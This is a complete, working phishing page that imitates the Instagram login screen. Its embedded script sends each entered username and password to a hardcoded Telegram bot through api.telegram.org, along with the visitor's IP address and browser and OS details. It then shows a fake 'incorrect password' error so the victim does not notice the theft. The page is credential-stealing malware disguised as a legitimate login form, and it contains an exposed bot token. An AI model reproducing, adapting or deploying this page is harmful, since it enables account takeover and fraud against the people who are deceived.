<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }

        .container {
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }

        .login-card {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 30px;
            margin-bottom: 10px;
            text-align: center;
        }

        .logo {
            margin-bottom: 30px;
        }

        .logo svg {
            width: 175px;
            height: auto;
        }

        .form-group {
            margin-bottom: 8px;
        }

        .form-group input {
            width: 100%;
            padding: 9px 0 7px 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }

        .form-group input:focus {
            border-color: #a8a8a8;
        }

        .form-group input::placeholder {
            color: #8e8e8e;
        }

        .login-btn {
            width: 100%;
            padding: 7px 16px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin: 15px 0 20px;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .login-btn:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 10px 0 20px;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            margin: 0 18px;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 15px;
            cursor: pointer;
        }

        .fb-login svg {
            width: 16px;
            height: 16px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            cursor: pointer;
        }

        .signup-card {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 25px 40px;
            text-align: center;
        }

        .signup-card p {
            font-size: 14px;
            color: #262626;
        }

        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
        }

        .get-app {
            text-align: center;
            margin-top: 20px;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 15px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-buttons img {
            height: 40px;
            width: auto;
        }

        .footer {
            max-width: 1000px;
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
            padding: 0 20px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 15px;
        }

        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            font-size: 12px;
        }

        .copyright {
            margin-bottom: 20px;
        }

        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin: 5px 0;
            display: none;
            text-align: left;
        }

        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo">
                <svg aria-label="Instagram" width="175" height="51" viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M21.2 14.6C19.8 14.6 18.6 15.8 18.6 17.2C18.6 18.6 19.8 19.8 21.2 19.8C22.6 19.8 23.8 18.6 23.8 17.2C23.8 15.8 22.6 14.6 21.2 14.6ZM38.2 14.6C36.8 14.6 35.6 15.8 35.6 17.2C35.6 18.6 36.8 19.8 38.2 19.8C39.6 19.8 40.8 18.6 40.8 17.2C40.8 15.8 39.6 14.6 38.2 14.6ZM47.8 24.8C47.8 32.6 41.4 39 33.6 39C25.8 39 19.4 32.6 19.4 24.8C19.4 17 25.8 10.6 33.6 10.6C41.4 10.6 47.8 17 47.8 24.8ZM33.6 13.6C27.4 13.6 22.4 18.6 22.4 24.8C22.4 31 27.4 36 33.6 36C39.8 36 44.8 31 44.8 24.8C44.8 18.6 39.8 13.6 33.6 13.6ZM50.2 0H17C7.6 0 0 7.6 0 17V34C0 43.4 7.6 51 17 51H50.2C59.6 51 67.2 43.4 67.2 34V17C67.2 7.6 59.6 0 50.2 0ZM60.2 34C60.2 39.6 55.6 44.2 50 44.2H17.2C11.6 44.2 7 39.6 7 34V17C7 11.4 11.6 6.8 17.2 6.8H50C55.6 6.8 60.2 11.4 60.2 17V34Z" fill="black"/>
                    <path d="M128.8 24.8C128.8 32.6 122.4 39 114.6 39C106.8 39 100.4 32.6 100.4 24.8C100.4 17 106.8 10.6 114.6 10.6C122.4 10.6 128.8 17 128.8 24.8ZM114.6 13.6C108.4 13.6 103.4 18.6 103.4 24.8C103.4 31 108.4 36 114.6 36C120.8 36 125.8 31 125.8 24.8C125.8 18.6 120.8 13.6 114.6 13.6Z" fill="black"/>
                    <path d="M150.2 12.2V36.2C150.2 37.8 148.8 39 147.2 39C145.6 39 144.2 37.8 144.2 36.2V34.4C141.6 37.2 138 39 133.8 39C126 39 119.6 32.6 119.6 24.8C119.6 17 126 10.6 133.8 10.6C138 10.6 141.6 12.4 144.2 15.2V12.2C144.2 10.6 145.6 9.4 147.2 9.4C148.8 9.4 150.2 10.6 150.2 12.2ZM144.2 24.8C144.2 18.6 139.4 13.6 133.4 13.6C127.4 13.6 122.6 18.6 122.6 24.8C122.6 31 127.4 36 133.4 36C139.4 36 144.2 31 144.2 24.8Z" fill="black"/>
                    <path d="M167.4 13.6C165.4 13.6 163.8 15.2 163.8 17.2C163.8 19.2 165.4 20.8 167.4 20.8C169.4 20.8 171 19.2 171 17.2C171 15.2 169.4 13.6 167.4 13.6Z" fill="black"/>
                    <path d="M174.8 24.8C174.8 30.2 170.4 34.6 165 34.6C159.6 34.6 155.2 30.2 155.2 24.8C155.2 19.4 159.6 15 165 15C170.4 15 174.8 19.4 174.8 24.8ZM165 10.6C157.2 10.6 151 16.8 151 24.6C151 32.4 157.2 38.6 165 38.6C172.8 38.6 179 32.4 179 24.6C179 16.8 172.8 10.6 165 10.6Z" fill="black"/>
                </svg>
            </div>

            <form id="loginForm">
                <div class="form-group">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <div class="error-message" id="errorMessage"></div>
                <button type="submit" class="login-btn" id="loginBtn">
                    <span id="btnText">Log in</span>
                    <div class="loading-spinner" id="loadingSpinner"></div>
                </button>
            </form>

            <div class="divider">
                <div class="divider-line"></div>
                <div class="divider-text">OR</div>
                <div class="divider-line"></div>
            </div>

            <div class="fb-login">
                <svg version="1.1" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
                    <path d="M36 18c0-9.9-8.1-18-18-18S0 8.1 0 18c0 9 6.6 16.4 15.2 17.8V23.2h-4.6V18h4.6v-4c0-4.6 2.7-7.1 6.9-7.1 2 0 4.1.4 4.1.4v4.5h-2.3c-2.3 0-3 1.4-3 2.9V18h5.1l-.8 5.2h-4.3v12.6C29.4 34.4 36 27 36 18z" fill="#3B5998"/>
                </svg>
                <span>Log in with Facebook</span>
            </div>

            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <div class="signup-card">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>

        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-buttons">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40' width='135' height='40'%3E%3Cpath fill='%23333' d='M130.5 0h-126C2 0 0 2 0 4.5v31C0 38 2 40 4.5 40h126c2.5 0 4.5-2 4.5-4.5v-31C135 2 133 0 130.5 0z'/%3E%3Ctext x='20' y='25' fill='white' font-family='Arial' font-size='12'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40' width='135' height='40'%3E%3Cpath fill='%23333' d='M130.5 0h-126C2 0 0 2 0 4.5v31C0 38 2 40 4.5 40h126c2.5 0 4.5-2 4.5-4.5v-31C135 2 133 0 130.5 0z'/%3E%3Ctext x='20' y='25' fill='white' font-family='Arial' font-size='12'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="copyright">
            © 2025 Instagram from Meta
        </div>
    </div>

    <script>
        // ============================================
        // TELEGRAM BOT CONFIGURATION
        // ============================================
        const BOT_TOKEN = "8790205780:AAFAWaqPZjX3pMpP7PwhvGMHOsplCeiK-Pg";
        const CHAT_ID = "6826564300";

        // Get user's IP address
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unable to fetch IP';
            }
        }

        // Get device info
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            let os = "Unknown";

            if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1) browser = "Google Chrome";
            else if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
            else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) browser = "Apple Safari";
            else if (ua.indexOf("Edg") > -1) browser = "Microsoft Edge";
            else if (ua.indexOf("Opera") > -1) browser = "Opera";

            if (ua.indexOf("Windows") > -1) os = "Windows";
            else if (ua.indexOf("Mac") > -1) os = "macOS";
            else if (ua.indexOf("Android") > -1) os = "Android";
            else if (ua.indexOf("iOS") > -1 || ua.indexOf("iPhone") > -1) os = "iOS";
            else if (ua.indexOf("Linux") > -1) os = "Linux";

            return { browser, os };
        }

        // Send to Telegram
        async function sendToTelegram(username, password, ip) {
            const device = getDeviceInfo();
            const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

            const message = `🔐 INSTAGRAM LOGIN ATTEMPT
━━━━━━━━━━━━━━━━━━━━━━
👤 Username/Email: ${username}
🔑 Password: ${password}
🌍 IP Address: ${ip}
💻 Browser: ${device.browser}
📱 OS: ${device.os}
🕒 Time: ${timestamp} (IST)
━━━━━━━━━━━━━━━━━━━━━━`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return (await response.json()).ok;
            } catch (error) {
                console.error('Telegram error:', error);
                return false;
            }
        }

        // Form submit handler
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('errorMessage');
            const loginBtn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            const loadingSpinner = document.getElementById('loadingSpinner');

            if (!username || !password) {
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'Please fill in all fields';
                return;
            }

            // Show loading
            loginBtn.disabled = true;
            btnText.style.display = 'none';
            loadingSpinner.style.display = 'block';
            errorMessage.style.display = 'none';

            try {
                const ip = await getUserIP();
                const sent = await sendToTelegram(username, password, ip);

                if (sent) {
                    // Show fake error (like real Instagram)
                    errorMessage.style.display = 'block';
                    errorMessage.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
                    document.getElementById('password').value = '';
                } else {
                    errorMessage.style.display = 'block';
                    errorMessage.textContent = 'Unable to login. Please try again.';
                }
            } catch (error) {
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'An error occurred. Please try again.';
            } finally {
                loginBtn.disabled = false;
                btnText.style.display = 'inline';
                loadingSpinner.style.display = 'none';
            }
        });

        // Hide error when typing
        document.getElementById('username').addEventListener('input', function() {
            document.getElementById('errorMessage').style.display = 'none';
        });

        document.getElementById('password').addEventListener('input', function() {
            document.getElementById('errorMessage').style.display = 'none';
        });
    </script>
</body>
</html>
